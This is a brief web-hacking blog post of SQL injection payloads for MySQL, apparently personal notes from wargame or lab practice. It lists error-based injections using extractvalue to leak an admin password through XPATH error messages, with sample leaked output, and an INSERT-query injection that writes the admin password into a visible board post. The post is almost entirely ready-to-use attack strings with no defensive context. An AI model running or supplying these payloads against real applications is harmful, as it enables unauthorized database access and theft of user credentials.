---
title: sqli
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---


> **MySQL Error based sql injection**

```mysql
admin' AND extractvalue(null, ( SELECT upw from user where uid='admin' ) );

# output : (1105, "XPATH syntax error: 'PasSwOrD123...'")


admin' AND extractvalue(null, concat(0x23, ( SELECT upw from user where uid='admin' ) ) );
admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 1, 20) from user where uid='admin' ) ) );
admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 21, 100) from user where uid='admin' ) ) );
```

<br>

> **MySQL Insert query injection**

```
query = "insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0);"

insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0);

asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#
```
